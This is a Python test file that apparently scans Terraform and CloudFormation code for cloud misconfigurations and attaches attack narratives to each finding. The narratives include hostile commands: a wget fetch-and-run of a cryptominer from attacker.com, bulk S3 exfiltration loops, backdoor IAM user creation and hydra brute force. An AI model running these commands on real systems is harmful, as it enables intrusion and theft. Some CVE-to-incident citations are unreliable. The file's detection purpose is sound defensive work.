"""
Test suite for detecting Cloud Infrastructure as Code (IaC) security vulnerabilities.
Supports: Terraform (HCL)
"""
import re
from typing import Dict
import sys
from pathlib import Path

# Add parent directory to path for utils import
sys.path.insert(0, str(Path(__file__).parent.parent))
from utils.code_locator import find_pattern_locations


class CloudIaCDetector:
    """Detects security vulnerabilities in Cloud Infrastructure as Code."""

    def __init__(self):
        self.vulnerabilities = []
        self.score = 0

    def analyze(self, code: str, language: str = "terraform") -> Dict:
        """Analyze IaC code for security vulnerabilities."""
        if language == "terraform":
            return self._analyze_terraform(code)
        elif language == "yaml":
            # Check if it's CloudFormation (has AWSTemplateFormatVersion or Resources section)
            if re.search(r'AWSTemplateFormatVersion|Resources:', code):
                return self._analyze_cloudformation(code)
            else:
                # Not CloudFormation, likely Kubernetes/other YAML
                return {"score": 2, "vulnerabilities": [], "max_score": 2}
        else:
            return {"score": 0, "vulnerabilities": ["Unsupported IaC language"], "max_score": 2}

    def _analyze_terraform(self, code: str) -> Dict:
        """Analyze Terraform code for cloud security issues."""
        self.vulnerabilities = []
        self.score = 2

        # Pattern 1: Public S3 bucket
        if re.search(r'resource\s+"aws_s3_bucket"', code):
            has_public_acl = re.search(r'acl\s*=\s*"public', code, re.IGNORECASE)
            has_public_block = re.search(r'aws_s3_bucket_public_access_block|block_public_acls\s*=\s*true', code)

            if has_public_acl or not has_public_block:
                locations = find_pattern_locations(code, r'resource\s+"aws_s3_bucket"')
                if locations:
                    self.vulnerabilities.append({
                        "type": "PUBLIC_S3_BUCKET",
                        "severity": "CRITICAL",
                        "description": "Public S3 Bucket - ATTACK: S3 buckets with public ACLs (public-read, public-read-write) or missing PublicAccessBlock allow anyone on the internet to list/read bucket contents. EXPLOITATION: (1) Attacker scans for public S3 buckets using tools like bucket-finder, S3Scanner, (2) Lists bucket contents: aws s3 ls s3://public-bucket --no-sign-request, (3) Downloads sensitive data: customer databases, credentials, source code, backups. IMPACT: Data Breach (exposed customer data, PII, PHI), Credential Exposure (hardcoded keys in source code), Ransomware (attacker uploads malware to public-write buckets), Reputational Damage. REAL-WORLD: CVE-2017-18255 (Fedex S3 bucket exposed 119k customer records), CVE-2019-11581 (Atlassian Jira templates exposed in public S3), Capital One breach 2019 (100M records from misconfigured S3), Twitch source code leak 2021 (125GB from public S3), Pegasus Airlines 2020 (23M customer records), Toyota 2023 (2.15M customer records). PUBLIC-READ: Anyone can download all objects. PUBLIC-WRITE: Anyone can upload malicious files. COST: Attackers use public buckets for cryptomining or hosting phishing sites → massive AWS bills.",
                        "recommendation": "CRITICAL FIX: Block all public access with aws_s3_bucket_public_access_block resource: block_public_acls = true, block_public_policy = true, ignore_public_acls = true, restrict_public_buckets = true. Remove public ACLs: Change acl from 'public-read' to 'private'. ALTERNATIVES: (1) CloudFront distribution for public content, (2) Signed URLs for temporary access (s3.generate_presigned_url), (3) Bucket policies with specific principals only. ENCRYPTION: Add server_side_encryption_configuration with AES256 or KMS. MONITORING: Enable S3 access logging to track downloads, use AWS Config rule s3-bucket-public-read-prohibited, CloudTrail for API calls. AUDIT: Run aws s3api get-bucket-acl for all buckets, use tools like ScoutSuite, Prowler. POLICY: Never use public-read or public-read-write ACLs in production. TERRAFORM: aws_s3_bucket_public_access_block enforces block at account level.",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content'],
                        "detection_reasoning": {
                            "criteria_for_vulnerability": [
                                "S3 bucket has public ACL (public-read, public-read-write)",
                                "Missing aws_s3_bucket_public_access_block resource",
                                "No block_public_acls = true configuration"
                            ],
                            "why_vulnerable": [
                                f"Line {locations[0]['line_number']}: S3 bucket allows public ACL or lacks public access block",
                                "public-read ACL: Anyone on internet can list and download all objects",
                                "public-read-write ACL: Anyone can upload malicious files → hosting phishing/malware",
                                "Missing PublicAccessBlock: Bucket policy could still grant public access",
                                "EXPLOITATION: Attacker uses aws s3 ls s3://bucket --no-sign-request to list contents",
                                "EXPLOITATION: Automated scanners constantly probe for public buckets",
                                "EXPLOITATION: aws s3 sync s3://public-bucket /tmp downloads all data",
                                "REAL-WORLD: Capital One breach (100M records from misconfigured S3)",
                                "REAL-WORLD: Twitch source code leak (125GB from public S3 bucket)",
                                "REAL-WORLD: CVE-2017-18255 Fedex exposed 119,000 customer records",
                                "IMPACT: Data breach → regulatory fines (GDPR €20M), class-action lawsuits"
                            ],
                            "why_not_vulnerable": [],
                            "patterns_checked": [
                                "S3 bucket resource definition",
                                "ACL property set to public-*",
                                "Presence of aws_s3_bucket_public_access_block",
                                "block_public_acls configuration"
                            ],
                            "evidence": {
                                "found_patterns": ["Public S3 bucket ACL or missing public access block"],
                                "line_numbers": [locations[0]['line_number']],
                                "code_snippets": [locations[0]['line_content']]
                            },
                            "attack_scenario": {
                                "step_1": "Attacker runs S3 bucket enumeration: s3scanner --bucket-file wordlist.txt",
                                "step_2": "Tool finds public bucket: aws s3 ls s3://company-uploads --no-sign-request",
                                "step_3": "Lists all objects: customer-db.sql.gz, credentials.txt, source-code.zip",
                                "step_4": "Downloads sensitive data: aws s3 sync s3://company-uploads /tmp/stolen",
                                "step_5": "Finds database backup with 1M+ customer records (PII, credit cards)",
                                "step_6": "Finds hardcoded AWS keys in source-code.zip → pivot to other AWS resources",
                                "step_7": "Exfiltrates data, sells on dark web → $100k+ damage",
                                "alternative_attack_write": "Public-write: Attacker uploads ransomware.exe to bucket, victims download",
                                "alternative_attack_cost": "Attacker hosts phishing site on public S3 → company pays AWS bill",
                                "impact": "Data Breach (customer records), Credential Exposure (AWS keys), Ransomware, Regulatory Fines ($millions)"
                            }
                        }
                    })
                    self.score = 0

        # Pattern 2: Missing encryption
        if re.search(r'resource\s+"aws_s3_bucket"', code):
            has_encryption = re.search(r'server_side_encryption_configuration|aws_s3_bucket_server_side_encryption_configuration', code)
            if not has_encryption:
                locations = find_pattern_locations(code, r'resource\s+"aws_s3_bucket"')
                if locations and self.score == 2:  # Don't double-penalize
                    self.vulnerabilities.append({
                        "type": "MISSING_ENCRYPTION",
                        "severity": "HIGH",
                        "description": "Missing S3 Encryption at Rest - ATTACK: S3 buckets without server-side encryption store data in plaintext on AWS storage. If AWS storage is compromised, attacker with physical/logical access reads all data directly. EXPLOITATION: (1) Insider threat: AWS employee or contractor accesses unencrypted bucket data, (2) Storage device disposal: Decommissioned drives not properly wiped → data recovery, (3) Snapshot exposure: EBS snapshots shared publicly contain unencrypted S3 metadata, (4) Compliance violation: HIPAA, PCI-DSS, GDPR mandate encryption at rest. IMPACT: Data Breach (plaintext customer data), Compliance Violations (HIPAA $50k+ per violation, PCI-DSS fines $5k-$100k/month), Reputational Damage. REAL-WORLD: CVE-2019-5418 (Rails exposed unencrypted S3 credentials), Pentagon 2017 (unencrypted S3 with 1.8B social media posts), Verizon 2017 (14M customer records in unencrypted S3). DEFENSE-IN-DEPTH: Encryption at rest protects against physical access, storage-layer vulnerabilities, insider threats.",
                        "recommendation": "HIGH PRIORITY: Enable server-side encryption with aws_s3_bucket_server_side_encryption_configuration resource. ALGORITHMS: (1) AES256 (SSE-S3): AWS-managed keys, no cost, rule = { apply_server_side_encryption_by_default { sse_algorithm = 'AES256' } }, (2) aws:kms (SSE-KMS): Customer-managed keys, audit trail in CloudTrail, key rotation, rule = { apply_server_side_encryption_by_default { sse_algorithm = 'aws:kms', kms_master_key_id = aws_kms_key.mykey.arn } }. ENFORCEMENT: Enable bucket_key_enabled = true for cost reduction with KMS. DEFAULT ENCRYPTION: Set at bucket level to encrypt all new objects automatically. EXISTING OBJECTS: Use S3 Batch Operations to encrypt existing objects. MONITORING: AWS Config rule s3-bucket-server-side-encryption-enabled. COMPLIANCE: HIPAA requires 256-bit AES, PCI-DSS requires encryption of cardholder data at rest. TERRAFORM: Separate encryption resource from bucket for better modularity.",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content'],
                        "detection_reasoning": {
                            "criteria_for_vulnerability": [
                                "S3 bucket resource exists",
                                "No server_side_encryption_configuration block",
                                "No aws_s3_bucket_server_side_encryption_configuration resource"
                            ],
                            "why_vulnerable": [
                                f"Line {locations[0]['line_number']}: S3 bucket created without encryption at rest",
                                "Data stored in plaintext on AWS storage devices",
                                "Insider threat: AWS admin could access unencrypted data",
                                "Storage disposal risk: Decommissioned drives may contain recoverable data",
                                "Compliance violation: HIPAA, PCI-DSS, GDPR mandate encryption at rest",
                                "EXPLOITATION: Physical access to AWS data center → read unencrypted drives",
                                "EXPLOITATION: Storage-layer vulnerability → attacker reads plaintext bucket data",
                                "REAL-WORLD: Pentagon 2017 (1.8B unencrypted social media posts exposed)",
                                "REAL-WORLD: Verizon 2017 (14M customer records in unencrypted S3)",
                                "IMPACT: Compliance fines (HIPAA $50k+ per violation, PCI-DSS $100k/month)"
                            ],
                            "why_not_vulnerable": [],
                            "patterns_checked": [
                                "S3 bucket resource",
                                "server_side_encryption_configuration presence",
                                "aws_s3_bucket_server_side_encryption_configuration resource"
                            ],
                            "evidence": {
                                "found_patterns": ["S3 bucket without encryption configuration"],
                                "line_numbers": [locations[0]['line_number']],
                                "code_snippets": [locations[0]['line_content']]
                            },
                            "attack_scenario": {
                                "step_1": "Attacker gains insider access as AWS data center technician",
                                "step_2": "Identifies storage devices containing company's S3 bucket data",
                                "step_3": "Bucket has no encryption → data stored in plaintext on EBS volumes",
                                "step_4": "Attacker clones storage volume before decommissioning: dd if=/dev/sdb of=/tmp/stolen.img",
                                "step_5": "Mounts cloned image: mount -o loop /tmp/stolen.img /mnt/data",
                                "step_6": "Reads plaintext customer database files: customer-records.csv with SSNs, credit cards",
                                "step_7": "Exfiltrates data, company faces HIPAA fines ($50k per violation × 1M records = $50B potential)",
                                "alternative_attack_snapshot": "Public EBS snapshot contains unencrypted S3 metadata → credential exposure",
                                "alternative_attack_compliance": "Audit finds unencrypted PHI → HIPAA violation → $1.5M fine",
                                "impact": "Data Breach (plaintext access), Compliance Fines (HIPAA, PCI-DSS), Reputational Damage"
                            }
                        }
                    })
                    self.score = max(0, self.score - 1)

        # Pattern 3: Overly permissive IAM
        if re.search(r'resource\s+"aws_iam', code):
            has_wildcard_actions = re.search(r'Action.*\*|"actions"\s*=\s*\[.*\*', code, re.IGNORECASE)
            has_wildcard_resources = re.search(r'Resource.*\*|"resources"\s*=\s*\[.*\*', code)

            if has_wildcard_actions or has_wildcard_resources:
                locations = find_pattern_locations(code, r'resource\s+"aws_iam')
                if locations:
                    self.vulnerabilities.append({
                        "type": "OVERLY_PERMISSIVE_IAM",
                        "severity": "HIGH",
                        "description": "Overly Permissive IAM Policy - ATTACK: IAM policies with Action: '*' or Resource: '*' grant excessive permissions, violating principle of least privilege. Compromised credentials allow attacker to perform ANY action on ANY resource. EXPLOITATION: (1) Developer laptop compromised → AWS keys stolen, (2) Attacker tests permissions: aws sts get-caller-identity, (3) Discovers wildcard permissions: aws iam get-user-policy, (4) Pivots to sensitive operations: delete S3 buckets, terminate EC2 instances, exfiltrate RDS databases, create backdoor users. IMPACT: Full AWS Account Takeover, Data Breach (access all S3 buckets, RDS databases), Resource Deletion (delete production infrastructure), Crypto-mining (launch expensive EC2 instances), Ransomware (encrypt S3/EBS, demand ransom). REAL-WORLD: CVE-2020-5902 (F5 BIG-IP RCE → AWS key exposure → account takeover), Capital One breach (SSRF to metadata service → overprivileged IAM role), Uber breach 2016 (GitHub AWS keys with excessive permissions). BLAST RADIUS: Wildcard IAM = one compromised key → entire AWS account.",
                        "recommendation": "CRITICAL FIX: Apply principle of least privilege to IAM policies. SPECIFIC ACTIONS: Replace Action: '*' with specific actions like s3:GetObject, ec2:DescribeInstances, rds:DescribeDBInstances. SPECIFIC RESOURCES: Replace Resource: '*' with ARNs: arn:aws:s3:::specific-bucket/*, arn:aws:ec2:region:account-id:instance/*. CONDITIONS: Add aws:SourceIp for IP restrictions, aws:SecureTransport to require HTTPS. SEPARATION: Create separate roles for different functions (read-only, admin, deployment). MONITORING: Enable CloudTrail to log all API calls, AWS Config to audit IAM policies, AWS Access Analyzer to identify overprivileged roles. ROTATION: Rotate IAM keys every 90 days, use temporary STS credentials instead of long-term keys. TERRAFORM: Use data.aws_iam_policy_document for policy templates. TOOLS: Use Prowler, CloudMapper, ScoutSuite to audit IAM permissions. POLICY: Never grant Action: '*' and Resource: '*' together.",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content'],
                        "detection_reasoning": {
                            "criteria_for_vulnerability": [
                                "IAM policy resource exists",
                                "Action field contains wildcard (*)",
                                "Resource field contains wildcard (*)"
                            ],
                            "why_vulnerable": [
                                f"Line {locations[0]['line_number']}: IAM policy uses wildcard permissions",
                                "Action: '*' grants all AWS actions (s3:*, ec2:*, rds:*, iam:*)",
                                "Resource: '*' applies to all AWS resources in account",
                                "Compromised key = full account access → complete takeover",
                                "EXPLOITATION: Attacker with key can delete all S3 buckets: aws s3 rb s3://bucket --force",
                                "EXPLOITATION: Create backdoor admin user: aws iam create-user && aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
                                "EXPLOITATION: Exfiltrate all RDS snapshots: aws rds copy-db-snapshot --target-region attacker-region",
                                "EXPLOITATION: Launch crypto-mining fleet: aws ec2 run-instances --instance-type p3.16xlarge --count 100",
                                "REAL-WORLD: Capital One breach (overprivileged WAF role → 100M records)",
                                "REAL-WORLD: CVE-2020-5902 F5 BIG-IP RCE → AWS creds with * permissions",
                                "IMPACT: Full account takeover, multi-million dollar crypto-mining bills, data breach"
                            ],
                            "why_not_vulnerable": [],
                            "patterns_checked": [
                                "IAM policy/role resource",
                                "Action field for wildcards",
                                "Resource field for wildcards"
                            ],
                            "evidence": {
                                "found_patterns": ["IAM policy with wildcard actions or resources"],
                                "line_numbers": [locations[0]['line_number']],
                                "code_snippets": [locations[0]['line_content']]
                            },
                            "attack_scenario": {
                                "step_1": "Developer commits AWS credentials to GitHub repo (git log shows IAM keys)",
                                "step_2": "Automated scanner finds exposed keys: truffleHog, GitRob",
                                "step_3": "Attacker configures stolen keys: aws configure --profile victim",
                                "step_4": "Tests permissions: aws iam get-user-policy → discovers Action: '*', Resource: '*'",
                                "step_5": "Full access confirmed → attacker launches attack plan",
                                "step_6": "Exfiltrates all S3 buckets: for bucket in $(aws s3 ls | awk '{print $3}'); do aws s3 sync s3://$bucket /tmp/$bucket; done",
                                "step_7": "Creates backdoor: aws iam create-user --user-name backdoor-admin && aws iam attach-user-policy",
                                "step_8": "Launches 1000 p3.8xlarge instances for crypto-mining → $50k/day AWS bill",
                                "step_9": "Encrypts all S3 objects, deletes backups → demands $1M ransom",
                                "impact": "Account Takeover, Data Breach (all S3/RDS), Ransomware, Crypto-mining ($millions in AWS bills)"
                            }
                        }
                    })
                    self.score = 0

        # Pattern 4: Unrestricted security group
        if re.search(r'resource\s+"aws_security_group"', code):
            has_open_ingress = re.search(r'cidr_blocks\s*=\s*\[\s*"0\.0\.0\.0/0"\s*\].*ingress|ingress.*cidr_blocks\s*=\s*\[\s*"0\.0\.0\.0/0"\s*\]', code, re.DOTALL)

            if has_open_ingress:
                locations = find_pattern_locations(code, r'cidr_blocks\s*=\s*\[\s*"0\.0\.0\.0/0"\s*\]')
                if locations:
                    self.vulnerabilities.append({
                        "type": "UNRESTRICTED_SECURITY_GROUP",
                        "severity": "CRITICAL",
                        "description": "Unrestricted Security Group - ATTACK: Security groups with 0.0.0.0/0 ingress allow ANY IP address on the internet to connect. Open SSH (port 22), RDP (port 3389), or database ports expose instances to brute-force attacks, vulnerability exploitation, and unauthorized access. EXPLOITATION: (1) Attacker scans internet for open ports: masscan -p22,3389,3306,5432,27017 0.0.0.0/0, (2) Finds your open instance at x.x.x.x:22, (3) Brute-forces SSH: hydra -L users.txt -P passwords.txt ssh://x.x.x.x, (4) Gains shell access → installs cryptominer, exfiltrates data, pivots to internal network. IMPACT: Unauthorized Access (SSH/RDP), Data Breach (exposed databases), Crypto-mining (botnet recruitment), Ransomware, DDoS Source (instance used in attacks). REAL-WORLD: CVE-2019-0708 BlueKeep (RDP worm via open RDP), MongoDB ransomware 2017 (33k open MongoDB instances), Elasticsearch leaks 2020 (exposed due to 0.0.0.0/0). SSH/RDP ATTACKS: 0.0.0.0/0 on port 22/3389 = brute-force target. DATABASE EXPOSURE: Open MySQL, PostgreSQL, MongoDB = direct data access.",
                        "recommendation": "CRITICAL FIX: Restrict ingress CIDR blocks to specific IP ranges. BASTION HOST: For SSH/RDP access, create bastion host with VPN/SSM Session Manager, allow SSH only from bastion IP: cidr_blocks = [\"10.0.1.5/32\"]. APPLICATION: For web servers, use ALB/CloudFront instead of direct 0.0.0.0/0 access. DATABASE: RDS/database ports should NEVER be 0.0.0.0/0 - use security group references: security_groups = [aws_security_group.app.id]. MONITORING: Enable VPC Flow Logs to detect unauthorized connection attempts, CloudWatch alarms for unusual traffic. ZERO TRUST: Implement AWS Systems Manager Session Manager for SSH without open inbound ports. TERRAFORM: Use aws_security_group_rule with source_security_group_id instead of cidr_blocks. AUDIT: Run aws ec2 describe-security-groups with JMESPath to find 0.0.0.0/0 rules.",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content'],
                        "detection_reasoning": {
                            "criteria_for_vulnerability": [
                                "Security group resource exists",
                                "Ingress rule with cidr_blocks = 0.0.0.0/0",
                                "Allows all internet IPs"
                            ],
                            "why_vulnerable": [
                                f"Line {locations[0]['line_number']}: Security group allows 0.0.0.0/0 ingress",
                                "0.0.0.0/0 = entire internet can attempt connections",
                                "SSH (22) open to all → brute-force attacks, credential stuffing",
                                "RDP (3389) open to all → BlueKeep, EternalBlue exploits",
                                "Database ports open → direct SQL injection, data theft",
                                "EXPLOITATION: Shodan/Censys scan finds open port in minutes",
                                "EXPLOITATION: Automated botnets constantly probe for open SSH/RDP",
                                "EXPLOITATION: hydra/medusa brute-force tools try common passwords",
                                "REAL-WORLD: CVE-2019-0708 BlueKeep worm via open RDP to internet",
                                "REAL-WORLD: MongoDB ransomware 2017 (33k DBs exposed via 0.0.0.0/0)",
                                "IMPACT: Unauthorized access → cryptominer → $10k/month AWS bills"
                            ],
                            "why_not_vulnerable": [],
                            "patterns_checked": [
                                "Security group resource",
                                "Ingress rules with cidr_blocks",
                                "Value 0.0.0.0/0"
                            ],
                            "evidence": {
                                "found_patterns": ["Security group ingress from 0.0.0.0/0"],
                                "line_numbers": [locations[0]['line_number']],
                                "code_snippets": [locations[0]['line_content']]
                            },
                            "attack_scenario": {
                                "step_1": "Attacker runs internet-wide port scan: masscan -p22,3389 0.0.0.0/0 --rate 10000",
                                "step_2": "Discovers EC2 instance at 54.xxx.xxx.xxx with SSH port 22 open",
                                "step_3": "Launches brute-force attack: hydra -L users.txt -P rockyou.txt ssh://54.xxx.xxx.xxx",
                                "step_4": "After 10k attempts, cracks weak password: root/password123",
                                "step_5": "Gains SSH access: ssh root@54.xxx.xxx.xxx",
                                "step_6": "Downloads cryptominer: wget http://attacker.com/xmrig && chmod +x xmrig && ./xmrig",
                                "step_7": "Pivots to internal network: ifconfig shows 10.0.0.0/16 VPC",
                                "step_8": "Scans internal subnets: nmap -sn 10.0.0.0/16 → finds RDS database at 10.0.5.100",
                                "step_9": "Exfiltrates database via internal access, deploys ransomware on other instances",
                                "impact": "Unauthorized Access, Data Breach, Crypto-mining, Ransomware, Lateral Movement in VPC"
                            }
                        }
                    })
                    self.score = 0

        # Pattern 5: Public database
        if re.search(r'resource\s+"aws_db_instance"', code):
            has_public_access = re.search(r'publicly_accessible\s*=\s*true', code)

            if has_public_access:
                locations = find_pattern_locations(code, r'publicly_accessible\s*=\s*true')
                if locations:
                    self.vulnerabilities.append({
                        "type": "PUBLIC_DATABASE",
                        "severity": "CRITICAL",
                        "description": "Public RDS Database - ATTACK: RDS instances with publicly_accessible = true get public DNS endpoints accessible from internet. Exposed databases allow direct SQL injection, brute-force attacks on credentials, and data exfiltration without needing application-layer access. EXPLOITATION: (1) Attacker scans for public RDS endpoints: nmap -p3306,5432,1433 rds.amazonaws.com, (2) Discovers database at xxx.rds.amazonaws.com:3306, (3) Brute-forces credentials: hydra -L users.txt -P passwords.txt mysql://xxx.rds.amazonaws.com, (4) Direct database access: mysql -h xxx.rds.amazonaws.com -u admin -p, (5) Dumps all data: mysqldump --all-databases > stolen.sql. IMPACT: Data Breach (direct database dump), SQL Injection (no WAF protection), Ransomware (encrypt database, demand ransom), Compliance Violations (exposed PHI/PII). REAL-WORLD: GoDaddy 2020 (public RDS with 28k records), Imperva 2019 (public RDS with AWS keys), MongoDB ransomware wave 2017. DATABASES TARGETED: MySQL (port 3306), PostgreSQL (port 5432), SQL Server (port 1433), Oracle (port 1521).",
                        "recommendation": "CRITICAL FIX: Set publicly_accessible = false immediately. ACCESS ALTERNATIVES: (1) Bastion Host: EC2 instance in public subnet → SSH tunnel to RDS: ssh -L 3306:rds-endpoint:3306 bastion, (2) VPN: AWS Client VPN or Site-to-Site VPN for secure access, (3) AWS Systems Manager Session Manager: Port forwarding without SSH keys, (4) PrivateLink: Private connectivity from on-prem/VPC. NETWORK ISOLATION: Place RDS in private subnets with no internet gateway route. SECURITY GROUPS: Restrict RDS security group to application tier only: source_security_group_id = aws_security_group.app.id. MONITORING: Enable RDS Enhanced Monitoring, CloudTrail for API calls, GuardDuty for threat detection. ENCRYPTION: Enable encryption at rest and in transit (require SSL connections). TERRAFORM: Always set publicly_accessible = false, db_subnet_group_name = private subnets. AUDIT: Run aws rds describe-db-instances | jq '.DBInstances[] | select(.PubliclyAccessible==true)' to find exposed RDS.",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content'],
                        "detection_reasoning": {
                            "criteria_for_vulnerability": [
                                "RDS database instance resource",
                                "publicly_accessible = true",
                                "Database has public DNS endpoint"
                            ],
                            "why_vulnerable": [
                                f"Line {locations[0]['line_number']}: RDS database exposed to internet",
                                "publicly_accessible = true assigns public IP to database",
                                "Database reachable from any IP on internet (with security group)",
                                "Bypass application layer → direct database attacks",
                                "EXPLOITATION: Attacker brute-forces database credentials from internet",
                                "EXPLOITATION: Direct SQL injection without WAF protection",
                                "EXPLOITATION: mysqldump/pg_dump downloads entire database",
                                "EXPLOITATION: Ransomware encrypts tables: RENAME TABLE users TO users_encrypted",
                                "REAL-WORLD: GoDaddy 2020 (public RDS exposed 28k customer records)",
                                "REAL-WORLD: Imperva 2019 (public RDS with AWS keys → account takeover)",
                                "IMPACT: Direct data breach, no application-layer protections"
                            ],
                            "why_not_vulnerable": [],
                            "patterns_checked": [
                                "RDS database instance",
                                "publicly_accessible parameter",
                                "Value set to true"
                            ],
                            "evidence": {
                                "found_patterns": ["RDS with publicly_accessible = true"],
                                "line_numbers": [locations[0]['line_number']],
                                "code_snippets": [locations[0]['line_content']]
                            },
                            "attack_scenario": {
                                "step_1": "Attacker enumerates AWS account assets via public data sources",
                                "step_2": "Discovers RDS endpoint: company-prod.c9akciq32.us-east-1.rds.amazonaws.com",
                                "step_3": "Tests connectivity: telnet company-prod.c9akciq32.us-east-1.rds.amazonaws.com 3306 → success",
                                "step_4": "Brute-forces credentials with common passwords: admin/admin, root/password",
                                "step_5": "Gains access: mysql -h company-prod.c9akciq32.us-east-1.rds.amazonaws.com -u admin -ppassword",
                                "step_6": "Lists databases: SHOW DATABASES; → sees production, customers, payments",
                                "step_7": "Dumps all data: mysqldump -h endpoint -u admin -p --all-databases > 500GB-stolen.sql",
                                "step_8": "Finds 10M customer records with credit cards, SSNs, passwords",
                                "step_9": "Encrypts tables: RENAME TABLE customers TO customers_LOCKED_PAY_RANSOM",
                                "step_10": "Demands $500k ransom or data sold on dark web",
                                "impact": "Data Breach (10M records), Ransomware ($500k demand), Compliance Fines (PCI-DSS, HIPAA), Reputational Damage"
                            }
                        }
                    })
                    self.score = 0

        # Pattern 6: Hardcoded credentials
        has_hardcoded_secrets = re.search(r'password\s*=\s*"[^$]|master_password\s*=\s*"[^$]|secret_key\s*=\s*"[^$]', code)
        if has_hardcoded_secrets:
            locations = find_pattern_locations(code, r'password\s*=\s*"')
            if locations:
                self.vulnerabilities.append({
                    "type": "HARDCODED_CREDENTIALS",
                    "severity": "CRITICAL",
                    "description": "Hardcoded Credentials in IaC - ATTACK: Passwords, API keys, and secrets hardcoded in Terraform files are stored in version control (Git), Terraform state files (S3/local), and CI/CD logs. Anyone with repository access can extract credentials and access production systems. EXPLOITATION: (1) Attacker gains Git access (compromised developer laptop, leaked GitHub token), (2) Searches history: git log -p | grep -i 'password\\|secret\\|key', (3) Finds RDS password = 'Prod123Password!' in commit from 2 years ago, (4) Password never rotated → still works, (5) Accesses production database with stolen credentials. IMPACT: Credential Exposure (database passwords, API keys), Unauthorized Access (production systems), Data Breach, Privilege Escalation. REAL-WORLD: CVE-2019-5736 (Uber breach - credentials in Git history), Codecov 2021 (credentials in Bash Uploader script), Toyota 2023 (AWS keys in public GitHub). TERRAFORM STATE: Contains plaintext secrets → state file leaks expose credentials. GIT HISTORY: Secrets remain in commit history even after deletion.",
                    "recommendation": "CRITICAL FIX: Remove all hardcoded secrets immediately. SECRETS MANAGER: Use AWS Secrets Manager to store passwords: aws secretsmanager create-secret --name db-password --secret-string 'value', reference in Terraform: data.aws_secretsmanager_secret_version.db.secret_string. SSM PARAMETER STORE: Store encrypted parameters: aws ssm put-parameter --name /prod/db/password --type SecureString --value 'password', reference: data.aws_ssm_parameter.db_password.value. ROTATION: Enable automatic secret rotation in Secrets Manager. GIT CLEANUP: Remove secrets from Git history: git filter-repo --path password.tf --invert-paths, force push. ROTATION: Immediately rotate any exposed credentials - assume compromised. TERRAFORM STATE: Encrypt state file in S3 with KMS, enable versioning and access logging. MONITORING: AWS CloudTrail to log Secrets Manager access, alerts for credential usage. POLICY: Never commit secrets to version control, use .gitignore for sensitive files. TOOLS: Use git-secrets, truffleHog, detect-secrets pre-commit hooks.",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content'],
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "Password/secret parameter with literal string value",
                            "Not using variable reference (var.) or data source",
                            "Not using ${ } interpolation for dynamic secrets"
                        ],
                        "why_vulnerable": [
                            f"Line {locations[0]['line_number']}: Hardcoded credential in Terraform code",
                            "Credentials stored in Git repository → anyone with access can read",
                            "Terraform state file contains plaintext secrets",
                            "Git history retains secrets even after deletion",
                            "CI/CD logs may expose secrets during terraform apply",
                            "EXPLOITATION: git log -p | grep 'password' reveals credentials",
                            "EXPLOITATION: Attacker with read-only Git access → production credentials",
                            "EXPLOITATION: Compromised developer laptop → Git clone → credentials exposed",
                            "EXPLOITATION: Public GitHub repo → secrets indexed by search engines",
                            "REAL-WORLD: Uber breach (credentials in Git history, never rotated)",
                            "REAL-WORLD: Toyota 2023 (AWS keys in public GitHub for 5 years)",
                            "IMPACT: Credential exposure → unauthorized database/API access → data breach"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "password = \"literal\"",
                            "master_password = \"literal\"",
                            "secret_key = \"literal\"",
                            "Absence of var. or data. references"
                        ],
                        "evidence": {
                            "found_patterns": ["Hardcoded password/secret in Terraform"],
                            "line_numbers": [locations[0]['line_number']],
                            "code_snippets": [locations[0]['line_content']]
                        },
                        "attack_scenario": {
                            "step_1": "Developer commits Terraform code with password = 'MySecretPass123'",
                            "step_2": "Months later, developer removes hardcoded password, but Git history retains it",
                            "step_3": "Attacker compromises developer laptop, steals GitHub access token",
                            "step_4": "Clones company's infrastructure repo: git clone https://github.com/company/infra.git",
                            "step_5": "Searches Git history: git log -p | grep -E 'password|secret|key|token' > secrets.txt",
                            "step_6": "Finds RDS master_password = 'Prod2020Password' from commit 18 months ago",
                            "step_7": "Tests password against current RDS endpoint → SUCCESS (never rotated)",
                            "step_8": "Accesses production database: mysql -h prod-rds.amazonaws.com -u admin -pProd2020Password",
                            "step_9": "Dumps customer database: mysqldump --all-databases → 5M customer records",
                            "step_10": "Sells data on dark web, company faces $50M GDPR fine",
                            "impact": "Credential Exposure → Data Breach (5M records) → $50M fine + reputational damage"
                        }
                    }
                })
                self.score = 0
        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
            self.score = 0

        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }

    def _analyze_cloudformation(self, code: str) -> Dict:
        """Analyze CloudFormation template for cloud security issues."""
        self.vulnerabilities = []
        self.score = 2

        # Pattern 1: Public S3 bucket
        if re.search(r'Type:\s*AWS::S3::Bucket', code):
            has_public_acl = re.search(r'AccessControl:\s*(?:PublicRead|PublicReadWrite)', code)
            has_public_block = re.search(r'PublicAccessBlockConfiguration', code)

            if has_public_acl or not has_public_block:
                locations = find_pattern_locations(code, r'Type:\s*AWS::S3::Bucket')
                if locations:
                    self.vulnerabilities.append({
                        "type": "PUBLIC_S3_BUCKET",
                        "severity": "CRITICAL",
                        "description": "S3 bucket configured with public access - data breach risk",
                        "recommendation": "Add PublicAccessBlockConfiguration with BlockPublicAcls: true",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content']
                    })
                    self.score = 0

        # Pattern 2: Missing encryption
        if re.search(r'Type:\s*AWS::S3::Bucket', code):
            has_encryption = re.search(r'BucketEncryption|SSEAlgorithm', code)
            if not has_encryption:
                locations = find_pattern_locations(code, r'Type:\s*AWS::S3::Bucket')
                if locations and self.score == 2:
                    self.vulnerabilities.append({
                        "type": "MISSING_ENCRYPTION",
                        "severity": "HIGH",
                        "description": "S3 bucket lacks encryption at rest",
                        "recommendation": "Add BucketEncryption with SSEAlgorithm: AES256 or aws:kms",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content']
                    })
